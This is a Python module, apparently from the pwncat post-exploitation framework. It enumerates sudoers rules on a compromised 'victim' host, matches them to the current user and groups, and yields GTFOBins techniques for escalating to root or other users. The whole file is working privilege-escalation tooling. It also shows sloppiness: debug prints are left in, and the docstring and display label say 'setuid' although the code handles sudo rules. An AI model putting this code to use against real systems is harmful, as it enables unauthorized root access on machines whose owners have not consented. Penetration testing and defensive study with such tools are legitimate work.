#!/usr/bin/env python3

import pwncat
from pwncat.gtfobins import Capability, Stream, BinaryNotFound
from pwncat.modules.escalate import EscalateModule, EscalateError, GTFOTechnique, Technique


class Module(EscalateModule):
    """
    Utilize binaries marked SETUID to escalate to a different user.
    This module uses the GTFOBins library to generically locate
    payloads for binaries with excessive permissions.
    """

    def enumerate(self):
        """ Enumerate SUID binaries """
        print("sudoers enum")
        rules = []
        for fact in pwncat.modules.run(
            "enumerate.sudoers", progress=self.progress, types=["sudo"]
        ):

            # Doesn't appear to be a user specification
            if not fact.data.matched:
                continue

            # This specifies a user that is not us
            if (
                fact.data.user != "ALL"
                and fact.data.user != pwncat.victim.current_user.name
                and fact.data.group is None
            ):
                continue

            # Check if we are part of the specified group
            if fact.data.group is not None:
                for group in pwncat.victim.current_user.groups:
                    if fact.data.group == group.name:
                        break
                else:
                    # Non of our secondary groups match, was our primary group specified?
                    if fact.data.group != pwncat.victim.current_user.group.name:
                        continue

            # The rule appears to match, add it to the list
            rules.append(fact.data)
        print("len", len(rules))

        for rule in rules:
            print("rule.command", rule.command)
            for method in pwncat.victim.gtfo.iter_sudo(rule.command, caps=Capability.ALL):
                user = "root" if rule.runas_user == "ALL" else rule.runas_user
                print("yield")
                yield GTFOTechnique(user, self, method)

        # for fact in pwncat.modules.run(
        #     "sudo", progress=self.progress, types=["sudo"]
        # ):

        #     try:
        #         binary = pwncat.victim.gtfo.find_binary(fact.data.path, Capability.ALL)
        #     except BinaryNotFound:
        #         continue

        #     for method in binary.iter_methods(
        #         fact.data.path, Capability.ALL, Stream.ANY
        #     ):
        #         yield GTFOTechnique(fact.data.owner.name, self, method, sudo=True)

    def human_name(self, tech: "Technique"):
        return f"[cyan]{tech.method.binary_path}[/cyan] ([red]setuid[/red])"
